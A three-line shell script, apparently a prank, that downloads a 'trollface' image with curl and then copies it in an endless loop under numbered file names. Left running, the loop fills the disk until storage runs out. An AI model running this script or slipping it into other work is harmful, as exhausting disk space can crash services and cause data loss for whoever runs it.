curl -O http://ebakan.com/dump/trollface.png
i=1
while true; do cp trollface.png trollface$i.png; i=$((i+1)); done
